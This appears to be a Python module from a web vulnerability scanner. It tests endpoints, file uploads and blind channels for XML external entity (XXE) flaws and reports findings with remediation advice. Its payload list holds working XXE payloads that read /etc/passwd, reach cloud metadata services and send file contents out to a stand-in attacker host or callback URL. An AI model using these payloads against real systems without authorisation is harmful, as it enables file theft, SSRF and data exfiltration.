"""
xxe_scanner.py — XML External Entity (XXE) Vulnerability Scanner
================================================================
Advanced XXE detection module that tests for XML parsing vulnerabilities.

This scanner:
  1. Identifies XML endpoints and data submission points
  2. Tests for classic XXE attacks (file reading, SSRF via XXE)
  3. Detects blind XXE using out-of-band techniques
  4. Tests various XML parser configurations and libraries
  5. Checks for DTD and parameter entity injection
  6. Multi-stage detection: probe for XML parsing, then confirm with XXE
"""
import urllib.request, urllib.error, urllib.parse, re
from scanners.base_scanner import BaseScanner
from scanners.core.confidence import ConfidenceTracker as CT
from utils.anomaly import TimingAnomalyDetector, SizeAnomalyDetector
from utils.evasion import waf_evade
from utils.callback import build_callback_url

XXE_PAYLOADS = [
    # Classic file read XXE
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",

    # Windows file read
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<foo>&xxe;</foo>""",

    # Parameter entity XXE (bypasses some protections)
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://xxe-attacker.com/evil.dtd">
%xxe;
]>
<foo>test</foo>""",

    # Blind XXE with out-of-band
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-ID.burpcollaborator.net/xxe">
%xxe;
]>
<foo>test</foo>""",

    # SSRF via XXE — AWS metadata
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>""",

    # SSRF via XXE — GCP metadata
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]>
<foo>&xxe;</foo>""",

    # Internal network scan via XXE
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]>
<foo>&xxe;</foo>""",

    # Base64-encoded XXE (evades filters)
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<foo>&xxe;</foo>""",

    # SVG XXE (for file upload endpoints)
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>""",

    # SOAP XXE
    """<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
 <soap:Body>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <foo>&xxe;</foo>
 </soap:Body>
</soap:Envelope>""",

    # XInclude XXE
    """<?xml version="1.0" encoding="UTF-8"?>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file:///etc/passwd"/>
</foo>""",

    # DOCTYPE with SYSTEM identifier
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "file:///etc/passwd">
<foo>test</foo>""",

    # Error-based XXE (triggers error message with file contents)
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
 %eval;
 %error;
]>
<foo>test</foo>""",

    # Blind XXE parameter entity with out-of-band exfiltration
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % oob SYSTEM "http://xxe-attacker.com/?data=%file;">
 %oob;
]>
<foo>test</foo>""",

    # DOCX-style XXE (content type: application/vnd.openxmlformats-officedocument.wordprocessingml.document)
    """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",

    # XLSX-style XXE
    """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",

    # XSLT XXE
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:template match="/">
  <xxe>&xxe;</xxe>
 </xsl:template>
</xsl:stylesheet>""",

    # DTD parameter entity XXE
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % dtd "<!ENTITY xxe SYSTEM 'file:///etc/%file;'>">
 %dtd;
]>
<foo>&xxe;</foo>""",

    # Nested DTD parameter entity XXE
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY % p1 "file">
 <!ENTITY % p2 "://">
 <!ENTITY % p3 "/etc/passwd">
 <!ENTITY % xxe SYSTEM "%p1;%p2;%p3;">
 %xxe;
]>
<foo>test</foo>""",
]

XXE_INDICATORS = [
    r"root:x:0:0:",
    r"root:\$[0-9a-z]",
    r"\[extensions\]",
    r"\[fonts\]",
    r"\[mail\]",
    r"ami-id",
    r"instance-id",
    r"local-hostname",
    r"public-hostname",
    r"placement/",
    r"ssh-rsa",
    r"BEGIN RSA PRIVATE KEY",
    r"BEGIN CERTIFICATE",
    r"DAEMON",
    r"www-data",
    r"nobody",
    r"bin:",
    r"sys:",
    r"daemon:",
    r"redis_version",
    r"mysql_native_password",
]

XXE_ERROR_INDICATORS = [
    r"XML",
    r"XMLParse",
    r"XmlParse",
    r"ParseError",
    r"parser error",
    r"XML error",
    r"StartTag: invalid element name",
    r"unclosed token",
    r"EntityRef: expecting ';'",
]

XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/x-www-form-urlencoded",
    "multipart/form-data",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    "image/svg+xml",
]


class XxeScanner(BaseScanner):
    SCANNER_NAME = "XML External Entity (XXE) Scanner"
    _SCANNER_KEY = "xxe"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)
        self._headers = {
            "User-Agent": "LarShield/2.0 XXE Scanner",
            "Accept": "application/xml, text/xml, */*",
        }
        if self.auth_headers:
            self._headers.update(self.auth_headers)
        self._tested_endpoints = 0
        self._xxe_found = 0
        self._timing_detector = TimingAnomalyDetector()
        self._error_matched_payloads: list[str] = []  # PHASE 3: track error hits across payloads

    def _check_xxe_response(self, body, payload, endpoint, content_type=""):
        """Check if the response contains XXE indicators."""
        for pattern in XXE_INDICATORS:
            if re.search(pattern, body, re.IGNORECASE):
                self._xxe_found += 1
                self.log("CRITICAL",
                         f"[XXE] VULNERABILITY CONFIRMED! Endpoint: {endpoint} | "
                         f"Pattern matched: {pattern}")

                self.add_vuln(
                    title="XML External Entity (XXE) Injection",
                    severity="Critical",
                    category="Injection",
                    cvss_score=9.8,
                    cwe_ids=["CWE-611"],
                    owasp_category="A05:2021 – Security Misconfiguration",
                    description=(
                        f"An XXE vulnerability was confirmed at {endpoint}.\n"
                        f"Payload: `{payload[:100]}...`\n"
                        f"The XML parser processed external entities, allowing access to "
                        f"local files or internal network resources.\n\n"
                        f"Impact: Attackers can read sensitive files (credentials, configs), "
                        f"perform SSRF attacks, scan internal networks, and potentially achieve "
                        f"remote code execution."
                    ),
                    remediation=(
                        "1. DISABLE EXTERNAL ENTITIES in your XML parser:\n"
                        "   Java: DocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)\n"
                        "   Python: defusedxml library (defusedxml.ElementTree)\n"
                        "   .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit\n"
                        "   PHP: libxml_disable_entity_loader(true)\n"
                        "2. Use JSON or other data formats instead of XML where possible.\n"
                        "3. Implement input validation and sanitization on all XML data.\n"
                        "4. Upgrade XML parsing libraries to latest secure versions.\n"
                        "5. Use allowlist validation for XML schema/DTD references."
                    ),
                    evidence=f"Matched pattern: {pattern}",
                    payload=payload[:200],
                    request_details=f"Endpoint: {endpoint}",
                    response_details=f"Response length: {len(body)} chars",
                    confidence="Confirmed",
                )
                return True

        # PHASE 3: Error-based detection — single hit is UNCONFIRMED, two different
        # payloads matching upgrades to LIKELY
        error_matches = []
        for pattern in XXE_ERROR_INDICATORS:
            if re.search(pattern, body, re.IGNORECASE):
                error_matches.append(pattern)

        if error_matches:
            self._error_matched_payloads.append(payload)
            # Determine confidence by number of independent payload-hits
            if len(self._error_matched_payloads) >= 2:
                confidence = CT.LIKELY
            else:
                confidence = CT.UNCONFIRMED

            sev, cvss_capped, conf = CT.apply("High", 8.5, confidence)
            self._xxe_found += 1
            self.log("WARNING",
                     f"[XXE] {confidence} XXE (error-based) at {endpoint} | "
                     f"Pattern: {error_matches[0]} | Confidence: {confidence}")

            self.add_vuln(
                title="XML External Entity (XXE) — Error-Based Detection",
                severity=sev,
                category="Injection",
                cvss_score=cvss_capped,
                cwe_ids=["CWE-611"],
                owasp_category="A05:2021 – Security Misconfiguration",
                description=(
                    f"A **{confidence}** XXE indicator was detected at `{endpoint}` via XML error messages.\n"
                    f"Error pattern matched: `{error_matches[0]}`\n\n"
                    f"**Confidence: {confidence}** — this is based on a single error substring match. "
                    f"It may be a false positive (generic XML error on any malformed input). "
                    f"Manual verification is required before treating as exploitable.\n\n"
                    f"If {confidence == CT.LIKELY and 'multiple' or 'a single'} payload(s) triggered this: "
                    f"{len(self._error_matched_payloads)} independent payload(s) matched error patterns."
                ),
                remediation=(
                    "1. Disable DTD processing in your XML parser.\n"
                    "2. Implement proper error handling that does not expose internal details.\n"
                    "3. Use safe XML parsing libraries (defusedxml, etc.).\n"
                    "4. Manually verify: submit valid XML and see if error disappears."
                ),
                evidence=f"Error patterns matched: {error_matches} (confidence: {confidence})",
                payload=payload[:200],
                request_details=f"Endpoint: {endpoint}",
                response_details=f"Response length: {len(body)} chars",
                confidence=conf,
            )
            return True
        return False

    def _test_xml_endpoint(self, url, method="POST"):
        """Test an endpoint for XXE vulnerabilities — multi-stage: probe then confirm."""
        self._tested_endpoints += 1

        # Stage 1: Probe with simple XML to confirm XML parsing
        probe_payload = """<?xml version="1.0" encoding="UTF-8"?><foo>test</foo>"""
        try:
            if method.upper() == "POST":
                probe_body, probe_status, probe_headers = self._make_request(
                    url, method="POST", data=probe_payload.encode("utf-8"),
                    headers={**self._headers, "Content-Type": "application/xml"},
                    timeout=8, return_response_obj=True,
                )
            else:
                encoded = urllib.parse.quote(probe_payload)
                test_url = f"{url}?xml={encoded}"
                probe_body, probe_status, probe_headers = self._make_request(
                    test_url, timeout=8, return_response_obj=True,
                )

            if probe_status in [0, 404] or (probe_body and probe_status == 400):
                self.log("INFO", f"[XXE] Endpoint {url} does not appear to accept XML (status {probe_status})")
                return False

            self.log("INFO", f"[XXE] Endpoint {url} accepted XML (status {probe_status}) — proceeding with XXE tests")
        except Exception as e:
            self.log("ERROR", f"[XXE] Error probing endpoint {url}: {e}")
            return False

        # Stage 2: Send XXE payloads
        for i, payload in enumerate(XXE_PAYLOADS):
            try:
                if method.upper() == "POST":
                    body, status, headers = self._make_request(
                        url, method="POST", data=payload.encode("utf-8"),
                        headers={**self._headers, "Content-Type": "application/xml"},
                        timeout=8, return_response_obj=True,
                    )
                else:
                    encoded_payload = urllib.parse.quote(payload)
                    test_url = f"{url}?xml={encoded_payload}"
                    body, status, headers = self._make_request(
                        test_url, timeout=8, return_response_obj=True,
                    )

                if body and self._check_xxe_response(body, payload, url):
                    return True

            except Exception as e:
                self.log("ERROR", f"[XXE] Error testing payload {i+1} on {url}: {e}")

        return False

    def _discover_xml_endpoints(self):
        """Discover potential XML endpoints by analyzing the target."""
        discovered = []

        discovered.append((self.target, "POST"))

        common_paths = [
            "/api/xml", "/xml", "/soap", "/wsdl",
            "/api/upload", "/upload", "/api/data", "/api/endpoint",
            "/services/data", "/rest/xml", "/api/v1/xml",
            "/api/v2/xml", "/sitemap.xml", "/rss", "/feed",
            "/api/import", "/api/export", "/api/document",
        ]

        for path in common_paths:
            url = f"{self.target.rstrip('/')}{path}"
            try:
                body, status, headers = self._make_request(url, timeout=5, return_response_obj=True)
                if status in [200, 405, 415, 400]:
                    content_type = headers.get("Content-Type", "") if isinstance(headers, dict) else ""
                    if any(ct in content_type.lower() for ct in XML_CONTENT_TYPES):
                        discovered.append((url, "POST"))
                    else:
                        discovered.append((url, "POST"))
            except Exception as e:
                self.log("ERROR", f"[XXE] Error probing endpoint {url}: {e}")

        return discovered

    def _test_form_uploads(self):
        """Test form upload endpoints for XXE via various content types."""
        try:
            results = self.discovery_context or {}

            for form in results.get("forms", []):
                action = form.get("action", "")
                method = form.get("method", "POST")
                has_file_upload = any(
                    inp.get("type") == "file"
                    for inp in form.get("inputs", [])
                )

                if not has_file_upload:
                    continue

                self.log("INFO", f"[XXE] Testing file upload form: {action}")

                content_types = {
                    "image/svg+xml": [
                        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>""",
                    ],
                    "application/vnd.openxmlformats-officedocument.wordprocessingml.document": [
                        """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",
                    ],
                    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet": [
                        """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",
                    ],
                }

                for content_type, payloads in content_types.items():
                    for payload in payloads:
                        try:
                            body, status, headers = self._make_request(
                                action, method="POST", data=payload.encode("utf-8"),
                                headers={**self._headers, "Content-Type": content_type},
                                timeout=8, return_response_obj=True,
                            )
                            if body and self._check_xxe_response(body, payload, action, content_type):
                                return True
                        except Exception as e:
                            self.log("ERROR", f"[XXE] Error with content type {content_type}: {e}")
        except Exception as e:
            self.log("ERROR", f"[XXE] Error testing form uploads: {e}")
        return False

    def _test_blind_xxe(self, url, method="POST"):
        """Test for blind XXE using timing-based detection and error patterns."""
        self._tested_endpoints += 1

        callback_url = build_callback_url("/xxe-oob")
        oob_domain = callback_url.split("/")[2] if "//" in callback_url else "oob.dnslog.cn"

        blind_payloads = [
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY % xxe SYSTEM "http://""" + oob_domain + """/xxe-test">
 %xxe;
]>
<foo>test</foo>""",
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY % param1 SYSTEM "file:///etc/passwd">
 <!ENTITY % param2 "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>">
 %param2;
]>
<foo>&xxe;</foo>""",
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % oob "<!ENTITY exfil SYSTEM '""" + callback_url + """?data=%file;'>">
 %oob;
]>
<foo>test</foo>""",
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '""" + callback_url + """?data=%file;'>">
 %eval;
 %exfil;
]>
<foo>test</foo>""",
        ]

        # FIX: build_baseline expects fn(url, method, data, headers, timeout) positional args
        _xml_probe = b"<?xml version=\"1.0\"?><foo>test</foo>"
        _xml_headers = {**self._headers, "Content-Type": "application/xml"}
        self._timing_detector.build_baseline(
            lambda u, m, d, h, t: self._make_request(u, m, _xml_probe, _xml_headers, t),
            url, n=3, headers=self._headers
        )

        for payload in blind_payloads:
            try:
                body, status, elapsed = self._make_timed_request(
                    url, method="POST", data=payload.encode("utf-8"),
                    headers={**self._headers, "Content-Type": "application/xml"},
                    timeout=15,
                )

                if status != 0:
                    self.log("WARNING",
                             f"[XXE] Blind XXE probe sent to {url} (status={status}, elapsed={elapsed:.2f}s). "
                             f"Check OOB callback service for evidence.")

                    is_anom = self._timing_detector.test_payload(f"blind_xxe_{url}", elapsed, payload[:80], z_threshold=2.5)
                    if is_anom and elapsed > 5:
                        self.add_vuln(
                            title="Blind XXE — Possible Out-of-Band Detection",
                            severity="High",
                            category="Injection",
                            cvss_score=8.8,
                            cwe_ids=["CWE-611"],
                            owasp_category="A05:2021 – Security Misconfiguration",
                            description=(
                                f"A blind XXE vulnerability may exist at {url}.\n"
                                f"Sent out-of-band XXE probe that contacted {oob_domain}.\n"
                                f"Response time: {elapsed:.2f}s (possible OOB connection delay).\n"
                                f"Check your callback/collaborator service at {callback_url}.\n\n"
                                f"Impact: Blind XXE can be used to exfiltrate data via out-of-band channels."
                            ),
                            remediation=(
                                "1. Disable DTD processing entirely.\n"
                                "2. Block outbound connections from XML parsers.\n"
                                "3. Use safe XML parsing libraries.\n"
                                "4. Monitor for suspicious outbound connections."
                            ),
                            evidence=f"Blind XXE probe with {elapsed:.2f}s response time, callback: {callback_url}",
                            payload=payload[:200],
                            request_details=f"Endpoint: {url}",
                            response_details=f"HTTP {status}, elapsed {elapsed:.2f}s",
                            confidence="Medium",
                        )
                        return True
            except Exception as e:
                self.log("ERROR", f"[XXE] Error testing blind XXE on {url}: {e}")

        return False

    def run(self):
        self.log("INFO", f"[XXE] Starting advanced XXE vulnerability scanning on {self.target}...")
        self.log("INFO", f"[XXE] Testing with {len(XXE_PAYLOADS)} XXE payload variants")

        try:
            # Step 1: Discover XML endpoints
            self.log("INFO", "[XXE] Discovering potential XML endpoints...")
            endpoints = self._discover_xml_endpoints()
            self.log("INFO", f"[XXE] Found {len(endpoints)} potential XML endpoints to test")

            # Step 2: Test each discovered endpoint
            for url, method in endpoints:
                self.log("INFO", f"[XXE] Testing endpoint: {method} {url}")
                if self._test_xml_endpoint(url, method):
                    self.log("CRITICAL", f"[XXE] XXE vulnerability confirmed at {url}")

            # Step 3: Test file upload forms
            self.log("INFO", "[XXE] Testing file upload forms for XXE...")
            self._test_form_uploads()

            # Step 4: Blind XXE testing
            self.log("INFO", "[XXE] Testing for blind XXE vulnerabilities...")
            for url, method in endpoints[:3]:
                self._test_blind_xxe(url, method)

        except Exception as e:
            self.log("ERROR", f"[XXE] Unexpected error during scan: {e}")

        self.log("SUCCESS" if not self.vulns else "WARNING",
                 f"[XXE] Complete — {self._tested_endpoints} endpoints tested | "
                 f"{self._xxe_found} XXE vulnerability/vulnerabilities confirmed")
        return self.vulns
